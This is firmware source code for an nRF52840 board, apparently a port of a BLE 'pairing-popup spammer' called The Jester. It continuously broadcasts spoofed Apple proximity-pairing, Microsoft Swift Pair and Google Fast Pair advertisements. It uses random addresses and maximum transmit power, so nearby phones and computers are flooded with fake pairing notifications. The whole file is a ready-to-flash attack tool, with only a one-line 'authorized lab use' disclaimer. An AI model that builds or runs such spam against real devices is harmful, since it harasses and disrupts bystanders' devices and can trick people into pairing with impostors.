// The Jester — nRF52840 port of the BLE pairing-popup spammer.
//
// Floods crafted BLE advertising packets so nearby devices throw pairing
// notifications: Apple proximity pairing (AirPods cards), Microsoft Swift
// Pair (Windows), and Google Fast Pair (Android). Each advertisement uses a
// fresh random static address so targets keep seeing "new" devices.
//
// This is the nRF52840 counterpart to src/ble_spam/ble_spam.cpp (which
// targets the ESP32-S3's NimBLE radio). Uses the nRF52840's native BLE radio
// via the Adafruit Bluefruit library (bluefruit.h).
//
// Build/flash:  pio run -e nrf52840_ble_spam -t upload
//
// Note: Bluefruit::setAddr()'s exact signature has varied across Adafruit
// nRF52 core versions. If it fails to compile against your installed core,
// check the ble_gap_addr_t-based overload in bluefruit.h and adjust
// freshRandomAddress() accordingly.
//
// For authorized lab / classroom use.

#include <Arduino.h>
#include <bluefruit.h>

namespace {
constexpr uint32_t kAdvWindowMs = 40;  // air time per advertisement

// ---- Apple proximity pairing device models (2 bytes each) ----------------
const uint8_t kAppleModels[][2] = {
    {0x0E, 0x20},  // AirPods Pro
    {0x0A, 0x20},  // AirPods Max
    {0x0F, 0x20},  // AirPods (2nd gen)
    {0x13, 0x20},  // AirPods (3rd gen)
    {0x14, 0x20},  // AirPods Pro (2nd gen)
    {0x02, 0x20},  // AirPods
    {0x0B, 0x20},  // PowerBeats Pro
    {0x0C, 0x20},  // Beats Solo Pro
    {0x11, 0x20},  // Beats Studio Buds
    {0x16, 0x20},  // Beats Fit Pro
    {0x17, 0x20},  // Beats Studio3
    {0x12, 0x20},  // Beats Studio Pro
    {0x0D, 0x20},  // Beats Studio Buds+
};

// ---- Google Fast Pair model IDs (3 bytes each) ---------------------------
// Best-effort: registered model IDs trigger a named popup; unregistered ones
// may show a generic "device nearby" or nothing depending on the phone.
const uint8_t kFastPairModels[][3] = {
    {0xCD, 0x82, 0x56},
    {0x0E, 0x86, 0x6F},
    {0x92, 0xBB, 0xBD},
    {0x2D, 0x7A, 0x23},
    {0x82, 0x1F, 0x66},
};

// Display names, in the same order as kAppleModels — index-matched so the
// scan-response name agrees with the model ID in the advertisement.
const char* kAppleNames[] = {
    "AirPods Pro", "AirPods Max", "AirPods", "AirPods", "AirPods Pro",
    "AirPods", "Powerbeats Pro", "Beats Solo Pro", "Beats Studio Buds",
    "Beats Fit Pro", "Beats Studio3", "Beats Studio Pro", "Beats Studio Buds+",
};

// Punny names cycled through for Swift Pair (max 24 chars to fit the
// advertising payload alongside the fixed Swift Pair header).
const char* kSwiftPairNames[] = {
    "Pair-a-noid", "Bit Happens", "Toothless", "Connect Four", "404 Not Found",
    "Loading...", "Searching...", "Virus.exe", "Not a Bomb, Probably",
    "FBI Surveillance Van", "Nacho Bluetooth", "Bluetooth Hurts",
    "Tell My Wifi I Love Her", "The LAN Before Time", "Pretty Fly 4 a Wifi",
    "Get Off My LAN", "Abraham Linksys", "Martin Router King",
    "Vladimir Routin", "The Promised LAN", "Span Without a Trace",
    "It Hurts When IP", "Drop It Like a Hotspot", "Mom Click Here 4 $$$",
    "Beerial Killer", "McToothface", "Lost AirPod L", "Lost AirPod R",
    "Tooth Fairy", "Sir Pairs-a-Lot", "Notorious B.L.E.", "Pairs Hilton",
    "Buzz Lightbeer", "Yoda Best Connection", "R2-D-Tooth", "C-3PHone",
    "Bluetooth Skywalker", "Obi-Wan Connect-Me", "Pika-Pair-Chu",
    "Gotta Pair Em All", "This Is the Pair", "Baby Yoda's Pods",
    "Bluetooth or Knot", "Eargasm 3000", "Bass-ically Best", "Treble Maker",
    "Wave Rider Audio", "Sound Barrier", "Octave Overload",
    "Pitch Perfect Pods", "Decibel Devil", "Frequency Frenzy", "Static Cling",
    "Bluetooth N Beyond", "To Infinity N Buzz", "Houston We Have Pairing",
    "Rocket Man Buds", "Major Tom's Buds", "Cosmic Ray Speaker",
    "Beam Me Up Bluetooth", "Resistance Is Futile", "Live Long N Pair",
    "Bluetooth Engage", "Klingon Earbuds", "Toothless Dragon",
    "Winter Is Pairing", "Game of Tones", "Walking Bluetooth",
    "Brains... Pairing", "Hunger Pairs", "Matrix Has You", "Neo's Earbuds",
    "Why So Paired", "Bat-Signal Speaker", "I Am Iron Pod", "Hulk Pair Smash",
    "Thor's Hammer Speaker", "Wakanda 4Ever Pods", "Snap! No Pairing",
    "Last Airbuds", "Force Awakens Buds", "Death Star Speaker",
    "Falcon Audio", "It's a Trap", "Help Me Bluetooth", "Pod Racing Champ",
    "A New Connection", "Solo Bluetooth Story", "Earl Grey Speaker",
    "Make It So Pods", "Beam Me Up Scotty", "Khaaaan-nect Me",
    "Phasers to Pair", "Final Frontier Pods", "Wireless Whisperer",
    "Bluetooth Bandit", "Static Whisperer", "Pairing Initiated",
    "Sound Check Charlie", "Bluetooth Bouncer", "Pairing Dilemma",
    "Wave Surfer Audio", "Bluetooth Buccaneer", "Wireless Whirlwind",
    "Earbud Enigma", "Static Standoff", "Pairing Pandemonium",
    "Bluetooth Banshee", "Audio Ambush", "Frequency Phenomenon",
    "The Pairing Plot", "Sound Wave Saga", "Bandit King Buds",
    "Wireless Wraith", "Earbud Epidemic", "Static Spectacle",
    "Pairing Pursuit", "Bluetooth Barnacle", "Audio Apparition",
    "Frequency Fiasco", "Pairing Predator", "Sound Wave Specter",
    "Wireless Wormhole", "Earbud Eclipse", "Static Storm", "Pairing Puzzle",
    "Bluetooth Behemoth", "Audio Avalanche", "Speaker of the House",
    "Mic Drop Inc", "Bluetooth Identity", "Bourne Connectivity",
    "License to Pair", "Goldfinger Buds", "Dr No Signal", "Skyfall Speaker",
    "From Pairing w Love", "Quantum of Static", "Diamonds R 4Ever Buds",
    "Spy Who Paired Me", "Tinker Tailor BT", "Mission Impairable",
    "Ghost Protocol Pods", "Rogue Nation Speaker", "Maverick Pods",
    "Need 4 Speed Pairing", "Fast N Furious Freq", "Ka-Chow Connect",
    "Tow Mater Tunes", "Buzz's Buds", "Woody's Wireless",
    "Up Up N Connected", "Just Keep Pairing", "Boo's BT Buddy", "Remy Radio",
    "WALL-E Wireless", "Let It Pair (Frozen)", "Olaf's Hug Speaker",
    "Moana's Wifi", "You're Welcome BT", "We Don't Talk Pairing",
    "Coco's Radio", "Luca's Sea Sound", "Soul Jazz Speaker",
    "Brave Archery Audio", "Speed Pairing Inc", "Joy's Jukebox", "Fire N Wifi",
    "Star Wifi Power", "Panda Pairing", "Sushi Roll Speaker", "Ramen My Wifi",
    "Avo-Cardio Buds", "Toast of the Town", "Butter My Buds", "Brewtooth",
    "Espresso Yourself", "Latte Be Friends", "Mocha Me Crazy",
    "Donut Disturb", "Bagel Beats", "Wafflicious Wifi", "Pancake Pairing",
    "Cereal Connection", "Honey I'm Home BT", "Maple Syrup Speaker",
    "Cookie Monster Buds", "Pizza My Heart", "Cheesy Connection",
    "Taco Bout Bluetooth", "Lettuce Pair", "Olive You BT", "Soy Into You",
    "Whisk Me Away Buds", "Gouda Vibes Only", "Brie Mine Pairing",
    "Nutty Buddy Buds", "Chai Hard", "Mint Condition Buds",
    "Sugar Rush Speaker", "Pho Real Connection", "Curry On Pairing",
    "Dough Re Mi Speaker", "Wok This Way", "Soup-er Connection",
    "Bread Winner Buds", "Egg-cellent Pairing", "Holy Guacamole BT",
    "Salty But Sweet", "Fry Day Speaker", "Cookie Cutter Connect",
    "Spice Up My Life BT", "Pepperoni Pairing", "Mac N Cheese Speaker",
    "Gravy Train Audio", "Honeycomb Hideout", "Jellybean Jukebox",
    "Cinnamon Sync", "Pretzel Logic Pods", "Marshmallow Match",
    "Caramel Connection", "Glazed and Confused", "Toffee or Not Toffee",
};

// Display names, in the same order as kFastPairModels.
const char* kFastPairNames[] = {
    "Pixel Buds Pro", "Galaxy Buds2 Pro", "JBL Tune 230NC", "Sony WF-1000XM5", "Echo Buds",
};

constexpr uint16_t kAppearanceEarbuds = 0x0941;  // Bluetooth SIG appearance: Earbuds

// Blink count signals which spam type just went out (1=Apple, 2=Swift Pair,
// 3=Fast Pair) — there's no onboard RGB LED on the nRF52840 like the S3's.
void blinkLed(uint8_t times) {
    for (uint8_t n = 0; n < times; ++n) {
        digitalWrite(LED_BUILTIN, HIGH);
        delay(kAdvWindowMs / 2);
        digitalWrite(LED_BUILTIN, LOW);
        delay(kAdvWindowMs / 2);
    }
}

void freshRandomAddress() {
    ble_gap_addr_t addr;
    addr.addr_type = BLE_GAP_ADDR_TYPE_RANDOM_STATIC;
    for (uint8_t i = 0; i < 6; ++i) {
        addr.addr[i] = static_cast<uint8_t>(random(256));
    }
    addr.addr[5] |= 0xC0;  // top two bits set => static random address
    Bluefruit.setAddr(&addr);
}

// Puts a device name + headphone icon in the scan response so Windows'
// "Add a device" list shows e.g. "AirPods Pro" instead of "Unknown device".
void setAdvertisedName(const char* name) {
    Bluefruit.setName(name);
    Bluefruit.ScanResponse.clearData();
    Bluefruit.ScanResponse.addName();
    Bluefruit.ScanResponse.addAppearance(kAppearanceEarbuds);
}

void restartAdvertising() {
    Bluefruit.Advertising.stop();
    freshRandomAddress();
    Bluefruit.Advertising.start(0);
    delay(kAdvWindowMs);
    Bluefruit.Advertising.stop();
}

// Apple proximity pairing (AirPods-style popup card).
void spamApple() {
    const uint8_t idx = static_cast<uint8_t>(random(sizeof(kAppleModels) / 2));
    const uint8_t* model = kAppleModels[idx];
    setAdvertisedName(kAppleNames[idx]);

    uint8_t mfg[29];
    uint8_t i = 0;
    mfg[i++] = 0x4C;  // Apple, Inc. (LE)
    mfg[i++] = 0x00;
    mfg[i++] = 0x07;  // proximity pairing
    mfg[i++] = 0x19;  // payload length (25)
    mfg[i++] = 0x07;
    mfg[i++] = model[0];
    mfg[i++] = model[1];
    mfg[i++] = 0x55;  // status
    while (i < sizeof(mfg)) {
        mfg[i++] = static_cast<uint8_t>(random(256));  // battery/flags/auth (random)
    }

    Bluefruit.Advertising.clearData();
    Bluefruit.Advertising.addData(BLE_GAP_AD_TYPE_MANUFACTURER_SPECIFIC_DATA, mfg, sizeof(mfg));
    restartAdvertising();
    blinkLed(1);
}

// Microsoft Swift Pair (Windows pairing notification) — most reliable target.
void spamSwiftPair() {
    const char* name = kSwiftPairNames[random(sizeof(kSwiftPairNames) / sizeof(kSwiftPairNames[0]))];
    const uint8_t nameLen = static_cast<uint8_t>(strlen(name));
    setAdvertisedName(name);

    uint8_t mfg[5 + 31];  // company id(2) + beacon id(1) + sub-scenario(1) + reserved(1) + name
    uint8_t i = 0;
    mfg[i++] = 0x06;  // Microsoft (LE)
    mfg[i++] = 0x00;
    mfg[i++] = 0x03;  // Microsoft Beacon ID
    mfg[i++] = 0x00;  // Beacon sub-scenario
    mfg[i++] = 0x80;  // reserved (RSSI byte)
    for (uint8_t n = 0; n < nameLen; ++n) {
        mfg[i++] = static_cast<uint8_t>(name[n]);
    }

    Bluefruit.Advertising.clearData();
    Bluefruit.Advertising.addData(BLE_GAP_AD_TYPE_MANUFACTURER_SPECIFIC_DATA, mfg, i);
    restartAdvertising();
    blinkLed(2);
}

// Google Fast Pair (Android nearby-device popup).
void spamFastPair() {
    const uint8_t idx = static_cast<uint8_t>(random(sizeof(kFastPairModels) / 3));
    const uint8_t* model = kFastPairModels[idx];
    setAdvertisedName(kFastPairNames[idx]);

    uint8_t svc[5];
    svc[0] = 0x2C;  // Fast Pair UUID 0xFE2C (little-endian)
    svc[1] = 0xFE;
    svc[2] = model[0];
    svc[3] = model[1];
    svc[4] = model[2];

    Bluefruit.Advertising.clearData();
    Bluefruit.Advertising.addFlags(BLE_GAP_ADV_FLAGS_LE_ONLY_GENERAL_DISC_MODE);
    Bluefruit.Advertising.addData(BLE_GAP_AD_TYPE_SERVICE_DATA, svc, sizeof(svc));
    restartAdvertising();
    blinkLed(3);
}
}  // namespace

void setup() {
    Serial.begin(115200);
    delay(800);
    Serial.println("\n\n===== THE JESTER / NRF52840 BLE PAIRING-POPUP SPAMMER =====");

    pinMode(LED_BUILTIN, OUTPUT);
    digitalWrite(LED_BUILTIN, LOW);

    randomSeed(analogRead(A0));

    Bluefruit.begin();
    Bluefruit.setTxPower(8);  // max TX power on nRF52840
    Bluefruit.setName("");

    Serial.println("[BLE] Spamming Apple / Swift Pair / Fast Pair. Random static address per advert.");
}

void loop() {
    switch (random(3)) {
        case 0: spamApple();     break;
        case 1: spamSwiftPair(); break;
        default: spamFastPair(); break;
    }
}
